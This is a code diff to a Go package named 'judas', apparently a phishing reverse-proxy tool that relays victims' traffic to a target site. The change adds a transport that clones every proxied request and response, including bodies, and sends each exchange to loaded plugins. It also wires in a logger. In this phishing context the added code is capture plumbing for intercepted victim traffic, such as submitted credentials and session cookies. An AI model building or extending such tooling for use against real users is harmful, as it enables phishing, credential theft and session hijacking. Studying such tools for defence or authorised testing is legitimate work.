@@ -1,7 +1,9 @@
 package judas
 
 import (
+	"context"
 	"crypto/tls"
+	"log"
 	"net/http"
 	"net/http/httputil"
 	"strings"
@@ -53,9 +55,44 @@ func (p *phishingProxy) ModifyResponse(response *http.Response) error {
 	return nil
 }
 
+// InterceptingTransport sends the HTTP exchange to the loaded plugins.
+type InterceptingTransport struct {
+	http.RoundTripper
+	Plugins *PluginBroker
+}
+
+// RoundTrip executes the HTTP request and sends the exchange to judas's loaded plugins
+func (t *InterceptingTransport) RoundTrip(req *http.Request) (*http.Response, error) {
+	resp, err := t.RoundTripper.RoundTrip(req)
+	if err != nil {
+		return nil, err
+	}
+
+	request := &Request{Request: req}
+	clonedRequest, err := request.CloneBody(context.Background())
+	if err != nil {
+		return nil, err
+	}
+
+	response := &Response{Response: resp}
+	clonedResponse, err := response.CloneBody()
+	if err != nil {
+		return nil, err
+	}
+
+	httpExchange := &HTTPExchange{
+		Request:  clonedRequest,
+		Response: clonedResponse,
+	}
+
+	err = t.Plugins.SendResult(httpExchange)
+	return resp, err
+}
+
 // ProxyServer exposes the reverse proxy over HTTP.
 type ProxyServer struct {
 	reverseProxy *httputil.ReverseProxy
+	logger       *log.Logger
 }
 
 // HandleRequests reverse proxies all traffic to the target server.
@@ -72,5 +109,8 @@ func New(config *Config) *ProxyServer {
 		Transport:      phishingProxy.Transport,
 	}
 
-	return &ProxyServer{reverseProxy: reverseProxy}
+	return &ProxyServer{
+		reverseProxy: reverseProxy,
+		logger:       config.Logger,
+	}
 }
